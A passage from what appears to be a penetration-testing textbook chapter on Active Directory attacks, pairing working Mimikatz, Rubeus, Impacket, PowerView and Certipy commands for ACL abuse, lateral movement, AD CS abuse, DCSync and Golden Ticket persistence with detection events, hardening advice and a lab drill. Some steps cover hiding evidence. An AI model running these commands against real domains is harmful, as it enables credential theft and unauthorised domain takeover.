Set-DomainUserPassword -Identity john_admin -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)

# Option 2: Set a fake SPN on john_admin to make them Kerberoastable
Set-DomainObject -Identity john_admin -Set @{ServicePrincipalName='http/fake'}
.\Rubeus.exe kerberoast /user:john_admin /outfile:john.hash     # Request and save the ticket
# Crack offline with hashcat, recover john_admin's password
# Clean up — remove the fake SPN so it doesn't look suspicious
Set-DomainObject -Identity john_admin -Clear ServicePrincipalName
```

**GenericWrite** — Modify non-protected attributes. Set SPNs (targeted
Kerberoasting). Modify logon script. Set `msDS-AllowedToActOnBehalfOfOtherIdentity`
(RBCD attack).

```powershell
# GenericWrite on a computer → RBCD attack
# Build a raw security descriptor granting our FAKEMACHINE account delegation rights
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-FAKEMACHINE_SID)"
$bytes = New-Object byte[] ($sd.BinaryLength)                  # Allocate byte array the right size
$sd.GetBinaryForm($bytes, 0)                                   # Serialise the SD to bytes
Set-DomainObject -Identity target-server$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}  # Write it
```

**WriteDACL** — Modify the object's ACL. Grant yourself GenericAll,
then abuse that.

```powershell
# WriteDACL on Domain Admins group — grant yourself full control first
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity george -Rights All
# Now you have GenericAll on Domain Admins → add yourself directly
Add-DomainGroupMember -Identity "Domain Admins" -Members george
```

**WriteOwner** — Change the object's owner. The owner implicitly has
WriteDACL. Take ownership → grant yourself GenericAll → full control.

```powershell
# Take ownership of the Domain Admins group
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity george
# Now you own the group → implicit WriteDACL → grant yourself GenericAll → add yourself
```

**ForceChangePassword** — Reset a user's password without knowing the
current one.

```powershell
# Directly reset target_admin's password — no knowledge of the old password required
Set-DomainUserPassword -Identity target_admin -AccountPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)
```

**AddMember / Self** — Add members to a group. If you have this on
Domain Admins, you add yourself directly.

```powershell
# Directly add your account to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members george
```

### Finding ACL Abuse Paths

```powershell
# PowerView — find interesting ACLs on any object where a non-admin principal has dangerous rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|ForceChangePassword"
} | Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# BloodHound does this automatically and visualises the paths
# Query: "Shortest Paths to Domain Admin from Owned Principals"
```

### Expected Output — ACL Enumeration

**Success looks like:**
```
ObjectDN                                    ActiveDirectoryRights  SecurityIdentifier
--------                                    ---------------------  ------------------
CN=john_admin,CN=Users,DC=corp,DC=local    GenericAll             S-1-5-21-xxx-1234
CN=Domain Admins,CN=Users,DC=corp,DC=local WriteDacl              S-1-5-21-xxx-1108
```

Each result is a potential escalation path. `S-1-5-21-xxx-1234` is the SID of the account that has that right — resolve it with `ConvertFrom-SID S-1-5-21-xxx-1234` to see the username.

**Failure looks like:** Empty output — no interesting ACLs found, or PowerView isn't returning full results because you don't have sufficient LDAP read rights. Try running as a higher-privilege account.

---

## Lateral Movement In AD

You have credentials (plaintext, hash, or ticket) for one account. You
need to move to another machine. Every method has a different noise level
and a different detection profile.

### Pass-the-Hash (PtH)

**The attack**: Use an NTLM hash directly to authenticate. No password
cracking needed. The hash IS the credential in NTLM authentication.

```bash
# Run from WSL2 — all Impacket tools work with -hashes flag
# Format: -hashes LM_hash:NT_hash  (LM hash is usually aad3b435... — the blank LM hash)

# psexec — copies a service binary, starts it, gives you a shell. Noisy but reliable.
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# wmiexec — uses WMI to run commands. No service creation. Less noisy than psexec.
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# smbexec — creates a temporary service via SMB. Similar noise to psexec.
smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/admin@10.0.0.50

# Mimikatz — inject hash into current Windows session (spawns a new cmd.exe with those creds)
# Run from Windows, not WSL2
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
# Opens a new cmd.exe — everything from that shell authenticates as admin with that hash
```

### Expected Output — Pass-the-Hash (wmiexec)

**Success looks like:**
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
corp\admin
C:\>hostname
TARGET-PC
```

**Failure looks like:** `STATUS_LOGON_FAILURE` — the hash is wrong, or the account has been disabled, or NTLM is blocked. Try verifying the hash is correct by cracking it first. If NTLM is blocked, try Overpass-the-Hash to get a Kerberos ticket instead.

**Noise level**: MEDIUM. Creates service on target (psexec) or uses WMI
(wmiexec). The authentication itself is normal NTLM. The execution
method determines how loud it is.

### Pass-the-Ticket (PtT)

**The attack**: Inject a stolen Kerberos ticket into your session. The
ticket could be a TGT (gives you broad access) or a service ticket
(gives you access to one specific service).

```powershell
# Export ALL Kerberos tickets from LSASS memory to .kirbi files on disk
mimikatz# sekurlsa::tickets /export
# Produces files like [0;3e7]-2-0-40e10000-COMPUTER$@krbtgt-CORP.LOCAL.kirbi

# Inject a specific ticket into the current session
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus — more flexible, can inject base64-encoded tickets
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Verify the ticket was injected successfully
klist                         # Lists all Kerberos tickets in current session
dir \\dc01.corp.local\c$     # Test access — should work without credential prompt if ticket is valid
```

### Expected Output — Pass-the-Ticket

**Success looks like (klist):**
```
Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: Administrator @ CORP.LOCAL
        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 1/1/2024 12:00:00 (local)
        End Time:   1/1/2024 22:00:00 (local)
```

**Noise level**: LOW. Kerberos authentication is expected. No anomalous
NTLM traffic. No service creation. The ticket just needs to be valid.

### Overpass-the-Hash

**The attack**: Use an NTLM hash to request a Kerberos TGT. Convert NTLM
credentials into Kerberos credentials. Now you can use Kerberos-only
services.

```powershell
# Mimikatz — spawn a new process with hash injected; it requests a TGT automatically on first use
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:<HASH> /run:powershell.exe
# The new PowerShell session contacts the KDC and requests a proper Kerberos TGT

# Rubeus — more explicit, directly asks the KDC for a TGT using the hash as the key
.\Rubeus.exe asktgt /user:admin /rc4:<HASH> /ptt   # /ptt injects it into current session
```

**Why bother when PtH exists?** Some environments disable NTLM. Kerberos-only
networks. Overpass-the-hash lets you bridge from NTLM creds to Kerberos auth.

### PSRemoting / WinRM

```powershell
# Native PowerShell remote execution — standard Windows admin tool
$cred = Get-Credential              # Prompts for credentials
Enter-PSSession -ComputerName target -Credential $cred   # Interactive remote shell

# Non-interactive — run a command and return output
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami; hostname }

# Fan out — execute on multiple machines simultaneously (great for broad enumeration)
Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock { whoami }
```

**Noise level**: LOW. WinRM on port 5985/5986 is expected in managed
environments. PowerShell Remoting is a standard admin tool. The content
of the commands might be logged (PowerShell logging) but the connection
itself is normal.

### DCOM Lateral Movement

Covered in Chapter 19 (MMC20.Application, ShellWindows). DCOM
uses port 135 + dynamic RPC ports. It's expected management traffic.

### SMB — File Shares and Named Pipes

```bash
# Copy files to target via SMB — smbclient is in Impacket / standard Linux tools
smbclient //target/C$ -U 'corp.local/admin%P@ss' -c "put payload.exe Windows\Temp\payload.exe"

# PsExec (Sysinternals) — copies a service binary, executes, removes it
psexec.py corp.local/admin:'P@ss'@target cmd.exe
# How psexec works: copies binary to ADMIN$ share → creates a service → starts service → executes
# Noisy: creates a service, writes files, generates Event IDs 7045 (service installed) + 4697
```

### Noise Level Comparison

| Method | Protocol | Ports | Detection | Noise |
|--------|----------|-------|-----------|-------|
| psexec | SMB | 445 | Service creation (7045/4697) | HIGH |
| wmiexec | WMI/DCOM | 135+RPC | Process creation (4688) | MEDIUM |
| smbexec | SMB | 445 | Service creation | HIGH |
| PSRemoting | WinRM | 5985 | PS logging, network logon | LOW |
| DCOM | DCOM | 135+RPC | Process creation | MEDIUM |
| Pass-the-Ticket | Kerberos | 88, service port | Normal Kerberos | LOW |

---

## Privilege Escalation Paths

You're on a box with low privileges. You need SYSTEM or Domain Admin.
These are the escalation routes.

### Token Impersonation — Potato Attacks

Windows services often run as SYSTEM. If you can trick a SYSTEM service
into authenticating to you, you can impersonate that token. The "Potato"
family exploits different mechanisms to achieve this.

**JuicyPotato** (Windows Server 2016/2019, Win10 < 1809):
Abuses BITS/DCOM to get SYSTEM token via a rogue COM server.

**PrintSpoofer** (Win10 1809+, Server 2019):
Abuses the print spooler service. Creates a named pipe, tricks the
spooler into connecting, impersonates the connection.

```cmd
:: PrintSpoofer — from service account (e.g., IIS, MSSQL) to SYSTEM
:: -i = interactive (give me a shell), -c = command to run as SYSTEM
PrintSpoofer.exe -i -c cmd.exe
:: Opens cmd as SYSTEM
```

### Expected Output — PrintSpoofer

**Success looks like:**
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19044.2604]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**Failure looks like:** `[-] A privilege is missing` — means the account you're running from doesn't have `SeImpersonatePrivilege`. Check with: `whoami /priv`. Service accounts (IIS AppPool, MSSQL service accounts, Network Service) have this privilege by default.

**GodPotato** (works on most modern Windows):
Improved Potato variant. Reliable across versions.

```cmd
:: GodPotato — run any command as SYSTEM
:: -cmd = the command to execute as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"
:: Returns: nt authority\system
```

**Requirement**: You need `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
Service accounts (IIS, SQL, network service) have these by default.
That's why "webshell to SYSTEM" is a well-trodden path.

### Group Policy Abuse

If you can create or modify a GPO and link it to an OU containing your
targets, you can push code to every machine in that OU.

```powershell
# Check if you can create GPOs — look for CreateChild on the Policies container
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "CreateChild" }

# Check if you can link GPOs to OUs — look for GP-Link WriteProperty
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectAceType -match "GP-Link" }

# SharpGPOAbuse — add a scheduled task via GPO that runs on next Group Policy refresh
# Download from: https://github.com/FSecureLABS/SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\admin" --Command "cmd.exe" --Arguments "/c net localgroup Administrators george /add" --GPOName "Default Domain Policy"
```

**Impact**: Every machine that processes the GPO executes your command.
If you modify the Default Domain Policy, that's EVERY machine in the
domain. Including DCs.

### AD Certificate Services (AD CS) — ESC Attacks

AD CS is Microsoft's PKI implementation. Misconfigured certificate
templates are one of the most devastating escalation paths discovered
in recent years. The "ESCn" taxonomy (ESC1 through ESC8+) classifies
different misconfigurations.

**ESC1** — Template allows requestor to specify Subject Alternative Name (SAN):
```bash
# Certipy from WSL2 — find vulnerable templates first
certipy find -u george@corp.local -p 'P@ss' -dc-ip 10.0.0.1 -stdout

# Request a certificate with Administrator's UPN in the SAN field
# -upn = User Principal Name to embed in the certificate (we're faking Administrator's identity)
certipy req -u george@corp.local -p 'P@ss' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local

# Use the certificate to authenticate as Administrator and get an NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### Expected Output — Certipy ESC1

**Success looks like:**
```
Certipy v4.x.x - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[+] Trying to get TGT...
[+] Got TGT. Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[+] Got NT hash for 'administrator@corp.local': <NTLM_HASH_HERE>
```

**Failure looks like:** `[-] Got error while trying to request certificate` with `CERTSRV_E_TEMPLATE_DENIED` — the template exists but your account doesn't have Enroll permission. Check BloodHound for who has enrollment rights on that template.

**ESC4** — Vulnerable template ACLs allow modification:
```bash
# If you can modify a template: save the original config, make it ESC1-vulnerable, exploit, restore
certipy template -u george@corp.local -p 'P@ss' -template VulnTemplate -save-old   # Save current config as backup
# certipy modifies the template to enable SAN specification (makes it ESC1-vulnerable)
certipy req -u george@corp.local -p 'P@ss' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
# Restore original template to hide evidence of modification
certipy template -u george@corp.local -p 'P@ss' -template VulnTemplate -configuration old_config.json
```

**ESC8** — NTLM relay to AD CS web enrollment:
```bash
# Step 1: Set up ntlmrelayx to forward incoming NTLM auth to the CA's web enrollment page
# --adcs = AD CS mode, requests a certificate as the relayed identity
ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce the DC to authenticate to your machine (triggers the relay)
# PetitPotam or PrinterBug to force DC auth — run PetitPotam.py from WSL2
# python3 PetitPotam.py <your-attacker-IP> dc01.corp.local

# Result: ntlmrelayx receives the DC's NTLM auth and gets a certificate as the DC machine account
# DC machine account cert → DCSync → all hashes
```

**ESC11** — NTLM relay to the RPC certificate enrollment endpoint (newer variant):
```bash
# Certipy handles this relay natively
certipy relay -target ca-server.corp.local -ca CORP-CA -template DomainController
```

AD CS attacks are particularly devastating because certificates are
valid for their entire lifetime (typically 1 year). Even if the password
changes, the certificate remains valid. Persistent access through PKI.

### Trust Abuse — Child To Parent

If you're Domain Admin in a CHILD domain, you can escalate to Enterprise
Admin in the PARENT domain. The SID history injection attack:

```powershell
# From child domain (us.megacorp.local) → parent (megacorp.local)
# Forge a Golden Ticket for the child domain, but include the parent's Enterprise Admins SID

# /sids: appends the Enterprise Admins SID (RID 519) from the PARENT domain into the ticket's SID history
# When the parent DC processes this ticket, it sees the EA SID in SID history = Enterprise Admin access
mimikatz# kerberos::golden /user:Administrator /domain:us.megacorp.local /sid:S-1-5-21-CHILD-SID /krbtgt:<CHILD_KRBTGT_HASH> /sids:S-1-5-21-PARENT-SID-519 /ptt

# /sids: adds the Enterprise Admins SID (RID 519) from the parent domain to the ticket's SID history
# The parent DC sees this ticket, checks the SID history, grants Enterprise Admin access
```

This works because trusts within a forest are TRANSITIVE and SID
filtering is NOT applied within a forest by default. The forest is
the true security boundary. Domain boundaries within a forest are
administrative, not security.

---

## Domain Dominance

You have Domain Admin. Now what? Extract everything. Establish permanent
access. Own the domain so thoroughly that even if they find and fix the
initial compromise, you can walk back in.

### DCSync

**The attack**: Impersonate a Domain Controller and request password
replication. The target DC thinks you're another DC doing normal
replication and sends you every hash in the domain.

```powershell
# Mimikatz — dump specific account (quieter — one targeted replication request)
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump ALL accounts — one replication request per account (noisy but comprehensive)
mimikatz# lsadump::dcsync /domain:corp.local /all /csv

# Impacket from WSL2 — works without Mimikatz, runs over the network
# secretsdump performs dcsync over DRSR protocol (same technique, different tool)
secretsdump.py corp.local/admin:'P@ss'@dc01.corp.local

# What you get from a full domain dump:
# - NTLM hashes for every account in the domain
# - krbtgt hash (the master key for Golden Tickets)
# - Machine account hashes
# - Kerberos AES keys
# - Cached credentials (if any)
```

### Expected Output — DCSync

**Success looks like (secretsdump):**
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a123456789abcdef0123456789abcdef:::
george:1234:aad3b435b51404eeaad3b435b51404ee:abcdef0123456789abcdef0123456789:::
...
```

Format is `username:RID:LM_hash:NT_hash`. The NT hash is what you use for PtH.

**Failure looks like:** `[-] RemoteOperations failed: DCERPC Runtime Error code: 0x5 - rpc_s_access_denied` — your account doesn't have `Replicating Directory Changes` + `Replicating Directory Changes All` rights. You need Domain Admin or specifically delegated replication rights.

**Required rights**: The account needs `Replicating Directory Changes`
and `Replicating Directory Changes All` rights on the domain object.
Domain Admins have these. So does anyone you (or an admin) specifically
granted these rights to.

**Detection**: Event ID 4662 with properties matching directory replication.
Replication from a non-DC source IP. Monitoring for anomalous use of
the DRSR (Directory Replication Service Remote) protocol.

### NTDS.dit Extraction

The ntds.dit file IS the AD database. It contains every user account,
every hash, every secret. It's locked while AD DS is running. Getting
it requires either:

```cmd
:: Method 1: Volume Shadow Copy (VSS) — no service interruption, uses existing shadow copies
:: Create a shadow copy of the system drive (run as Administrator on DC)
vssadmin create shadow /for=C:

:: Copy ntds.dit from the shadow copy (file not locked in a shadow copy)
:: Replace HarddiskVolumeShadowCopy1 with the actual shadow copy device path from vssadmin output
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

:: Also need the SYSTEM hive — contains the boot key used to decrypt ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

:: Extract hashes offline — no need to be on the DC anymore
:: Run from WSL2 after copying ntds.dit and SYSTEM to your attack machine
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

```cmd
:: Method 2: ntdsutil — Microsoft's own AD maintenance tool (looks completely legitimate)
:: "activate instance ntds" = select the AD DS instance
:: "ifm" = Install From Media mode
:: "create full C:\Temp\AD_Backup" = create a full backup including ntds.dit
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\AD_Backup" quit quit
:: Creates a full AD backup including ntds.dit and registry hives
:: Intended for DC promotion — we're using it for hash extraction
```

```powershell
# Method 3: Invoke-NinjaCopy — reads raw disk sectors to bypass file locks
# Bypasses VSS entirely — reads the ntds.dit file directly from disk at the sector level
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\Temp\ntds.dit"
```

### Establishing Permanent Access

Once you have the krbtgt hash, you have the keys to the kingdom
forever (or until they rotate it twice):

1. **Golden Ticket** — forge TGTs at will, from anywhere, anytime
2. **Silver Tickets** — access specific services without touching the DC
3. **Skeleton Key** — patch LSASS on the DC to accept a master password
   for any account (mimikatz: `misc::skeleton`, password: "mimikatz")
4. **DSRM password** — Directory Services Restore Mode. A local admin
   password on every DC. Rarely changed. Access even if AD is down.
5. **AdminSDHolder** — protected object with ACLs that propagate to all
   privileged accounts every 60 minutes. Modify its ACL → your permissions
   persist even if removed from privileged groups.
6. **SID History injection** — add a privileged SID to your account's SID
   history. You get those privileges even though you're not in the group.
7. **AD CS certificates** — issue yourself a certificate as Domain Admin.
   Valid for the certificate's lifetime. Password changes don't revoke it.

### Forest Compromise — The Final Step

If the forest contains multiple domains and you own one:

```powershell
# Enumerate trusts — see all trust relationships from current domain
Get-DomainTrust
Get-ForestDomain   # All domains in the forest

# Child-to-parent with SID history (covered above in Trust Abuse section)
# Forest trust abuse — if SID filtering is misconfigured or disabled
# or if there's a shared admin account used across forest boundaries

# ExtraSids attack across an inter-forest trust
# Only works if SID filtering is disabled on the trust (check with: Get-DomainTrust)
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-CORP-SID /krbtgt:<KRBTGT_HASH> /sids:S-1-5-21-PARTNER-SID-519 /ptt
```

The forest boundary stops SID history injection BY DEFAULT (SID
filtering). But it's frequently misconfigured or disabled for
application compatibility. Check the trust properties.

---

## Defense Perspective — What Blue Team Watches

Understanding the defender's viewpoint makes you a better attacker AND
a better defender. This section is the mirror image.

### Honey Accounts and Deception

**Honey users**: Fake accounts with SPNs (Kerberoast bait). If anyone
requests a ticket for this SPN, it's an attacker. Alert fires immediately.

**Honey credentials**: Fake credentials planted in memory, LSASS, registry.
If used to authenticate — intruder detected.

**Honey shares**: Fake file shares with enticing names ("Finance_Reports",
"CEO_Email_Backup"). Any access attempt = alertable event.

**Canary tokens**: Files/credentials that phone home when accessed.
If the NTDS.dit gets exfiltrated and the canary credential is used
to authenticate anywhere — the defender knows the breach happened and
gets the attacker's IP.

### Detection Events To Monitor

| Attack | Detection Event | Event ID |
|--------|-----------------|----------|
| Kerberoasting | TGS request with RC4 encryption | 4769 (0x17 enc) |
| AS-REP Roasting | AS-REQ without pre-auth for flagged accounts | 4768 |
| Golden Ticket | TGT with abnormal lifetime or non-existent user | 4769, 4768 anomalies |
| DCSync | Directory replication from non-DC IP | 4662 |
| Pass-the-Hash | NTLM logon from unexpected source | 4624 (Type 3, NTLM) |
| DCOM lateral | DCOM connection + remote process creation | 4688 + network events |
| Service creation (psexec) | New service installed | 7045, 4697 |
| GPO modification | GPO changed outside of change window | 5136 (Directory change) |
| ACL modification | DACL changed on sensitive objects | 4662, 5136 |
| Certificate request | Certificate issued for privileged user from unusual source | AD CS audit events |

### Tiered Administration Model

The gold standard for AD defense:
- **Tier 0** — Domain Controllers, AD admins, PKI. Only Tier 0 accounts touch Tier 0 assets.
- **Tier 1** — Servers, applications. Tier 1 accounts only.
- **Tier 2** — Workstations, end-user support. Tier 2 accounts only.

A Domain Admin should NEVER log into a workstation. If they do, their
credentials get cached, and when that workstation gets compromised,
the attacker gets DA creds. Tiered admin prevents this credential
hop.

### Protected Users Group

Members of the Protected Users security group:
- No NTLM authentication (prevents PtH)
- No DES or RC4 in Kerberos (prevents Kerberoasting with weak encryption)
- No credential delegation
- No caching of credentials at logon
- TGT lifetime limited to 4 hours

Add sensitive accounts to Protected Users. It breaks some legacy
applications but dramatically reduces the attack surface.

### LAPS — Local Administrator Password Solution

Randomizes the local admin password on every domain-joined machine.
Without LAPS, the same local admin password is often deployed to every
workstation via image/GPO. Compromise one → compromise all.

With LAPS, each machine has a unique password stored in AD. Even if you
get one machine's local admin hash, it doesn't work on any other machine.

### Why Understanding AD Attacks Makes You Better At Defense

You can't defend what you don't understand. Every attack in this chapter
has a detection signature. Every technique has a defensive control.
When you read a SOC alert about "anomalous TGS request with RC4
encryption" — you know that's a Kerberoasting attempt. When you see
"directory replication from non-DC source" — you know that's DCSync.

The best defenders are people who've run the attacks themselves.
That's you.

---

## DEFENDER TAKEAWAY

This is what you do on Monday morning when you're responsible for the company's AD.

- **Audit SPNs on user accounts immediately.** Run `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name,ServicePrincipalName` in PowerShell. Every SPN on a user account is a Kerberoasting target. Service accounts should have strong, randomly generated 25+ character passwords and be rotated regularly. Use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs) — they rotate automatically.

- **Enable Kerberos pre-authentication on every account.** Run `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` to find AS-REP roastable accounts. There is almost never a legitimate reason to disable pre-auth. Fix it: `Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false`.

- **Deploy Microsoft LAPS immediately if you haven't.** Without LAPS, compromising one workstation gives you local admin everywhere. LAPS download: https://www.microsoft.com/en-us/download/details.aspx?id=46899. GPO-deploy it to all workstations in under an hour.

- **Add Domain Admins and all Tier 0 accounts to the Protected Users group.** This blocks NTLM authentication and RC4 Kerberos for those accounts — killing Pass-the-Hash and most Kerberoasting against your most sensitive accounts. Test one account first to confirm no legacy app breaks.

- **Enable advanced audit logging for these specific Event IDs on your DCs.** In Group Policy: Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration. Enable: Audit Directory Service Access (for 4662/5136), Audit Account Logon (for 4768/4769), Audit Logon (for 4624). Forward events to a SIEM. Alert on: 4769 with encryption type 0x17 (RC4 Kerberoasting), 4662 with DRSR property access from non-DC IPs (DCSync).

- **Run BloodHound against your own environment.** This is not optional. Run SharpHound with `--CollectionMethods All`, import into BloodHound, and run the query "Shortest Paths to Domain Admin." If any non-admin account has a path to DA in under 3 hops, fix it now. Pay particular attention to ACL-based paths — they are invisible in traditional AD tools.

- **Audit AD CS (certificate templates) with Certipy.** Run `certipy find -u <your-account> -p <password> -dc-ip <DC-IP> -stdout` from WSL2. Any template marked ESC1-ESC8 is an immediate escalation path. Common fix for ESC1: open Certificate Templates MMC, find the vulnerable template, Properties → Subject Name → uncheck "Supply in the request."

- **Implement a Kerberos delegation audit.** Run `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` — every result is a potential TGT theft point. Remove unconstrained delegation from any computer that doesn't absolutely need it. Replace with constrained delegation to specific SPNs only. DCs are allowed to have unconstrained delegation — everything else should not.

---

## Summary — Key Takeaways

- **Active Directory is the crown jewel.** Compromise AD and you own the
  entire enterprise. Every user, every machine, every secret. AD attacks
  are the endgame of enterprise penetration testing.

- **Enumeration comes first.** BloodHound, PowerView, ldapsearch. Map
  every user, group, computer, trust, ACL, and delegation before you
  attack anything. The shortest path to Domain Admin is usually NOT
  the obvious one.

- **Kerberoasting is the lowest-friction attack in AD.** Any authenticated
  user can request service tickets and crack them offline. No special
  privileges needed. Target service accounts with SPNs — they often have
  weak, never-rotated passwords.

- **ACL abuse is massively overlooked.** Misconfigured permissions are
  everywhere. GenericAll on a user means you own that user. WriteDACL
  on a group means you own that group. BloodHound finds these paths
  automatically.

- **The krbtgt hash is the master key.** With it you forge Golden Tickets
  for any user, any time, from anywhere. Valid until krbtgt is rotated
  TWICE. Most organisations never rotate it.

- **Delegation is a designed-in vulnerability.** Unconstrained delegation
  caches TGTs. Constrained delegation can be abused via S4U. RBCD can
  be set by anyone with write access to a computer object. All three are
  exploitable for privilege escalation and lateral movement.

- **AD CS is the newest attack frontier.** Misconfigured certificate
  templates (ESC1-ESC8+) provide escalation paths that survive password
  rotations. Certificates are valid for their entire lifetime regardless
  of credential changes.

- **DCSync is the quietest way to dump the domain.** Impersonate a DC,
  request replication, receive every hash. No file access on the DC.
  No service creation. Just normal replication traffic from an abnormal
  source.

- **Persistence in AD is almost unremovable without a full rebuild.**
  Golden Tickets, SID history, AdminSDHolder, skeleton keys, DSRM
  passwords, rogue certificates. If an attacker gets DA and has time,
  eviction requires rebuilding the forest from scratch.

- **Defence requires understanding offence.** Tiered administration,
  Protected Users, LAPS, honey accounts, Kerberos monitoring — every
  defensive control maps directly to an attack technique in this chapter.

---

## Drill 20 — Active Directory Warfare

Go to `DRILLS/20_ad_warfare/`. A vulnerable AD lab environment is waiting.

Your mission:
1. Enumerate the domain completely with BloodHound and PowerView
2. Find and exploit a Kerberoastable account
3. Identify an ACL abuse path to Domain Admin
4. Perform lateral movement using at least two different methods
5. Execute DCSync and extract the krbtgt hash
6. Forge a Golden Ticket and verify domain-wide access
7. Document every detection artifact your attack generated

Build the attack. Then build the defence.

---

## Key Terms

**Active Directory (AD)** — Microsoft's directory service for Windows domain networks. Stores user accounts, computer accounts, groups, and policy. The central authentication and authorisation system for enterprise Windows environments.

**Domain Controller (DC)** — A Windows server running AD DS. Stores the AD database, handles Kerberos and NTLM authentication, and replicates data to other DCs.

**Kerberos** — The default authentication protocol in AD environments. Uses tickets (TGT and Service Tickets) to authenticate users to services without repeatedly sending the password.

**TGT (Ticket Granting Ticket)** — The Kerberos "passport." Issued by the KDC on successful login, used to request service tickets. Encrypted with the krbtgt hash.

**krbtgt** — A special service account that encrypts all TGTs. Its NTLM hash is the master key for Golden Ticket attacks.

**SPN (Service Principal Name)** — A unique identifier for a service instance in Kerberos. Accounts with SPNs are Kerberoasting targets.

**Kerberoasting** — Requesting service tickets for accounts with SPNs and cracking them offline. Exploits the fact that any domain user can request any service ticket.

**AS-REP Roasting** — Requesting a TGT for accounts with pre-authentication disabled. Works without valid credentials if the target account has the flag set.

**Golden Ticket** — A forged TGT created using the krbtgt NTLM hash. Grants any privileges to any user. Valid until krbtgt is rotated twice.

**Silver Ticket** — A forged service ticket using a service account's NTLM hash. Provides access to that specific service without touching the DC.

**DCSync** — Impersonating a DC to request AD password replication. Extracts all hashes from the domain using the DRSR protocol.

**ntds.dit** — The Active Directory database file. Stored on Domain Controllers at `C:\Windows\NTDS\ntds.dit`. Contains all user hashes when decrypted with the SYSTEM boot key.

**Pass-the-Hash (PtH)** — Using an NTLM hash directly to authenticate without knowing the plaintext password.

**Pass-the-Ticket (PtT)** — Injecting a stolen Kerberos ticket into a session to authenticate as another user.

**Unconstrained Delegation** — A Kerberos delegation mode where a service receives and caches users' full TGTs. Compromise of an unconstrained delegation machine allows TGT theft.

**RBCD (Resource-Based Constrained Delegation)** — A delegation mode where the target resource controls who can delegate to it. Writable `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute enables privilege escalation.

**ACL (Access Control List)** — A list of permissions attached to an AD object. Misconfigured ACLs (GenericAll, WriteDACL, WriteOwner) are common escalation paths.

**BloodHound** — An AD attack path analysis tool. Collects relationships between AD objects and visualises paths to Domain Admin.

**SharpHound** — The data collector for BloodHound. Runs on domain-joined machines to gather AD relationship data.

**PowerView** — A PowerShell script for AD enumeration. Part of PowerSploit. Provides functions for querying users, groups, computers, ACLs, and trust relationships.

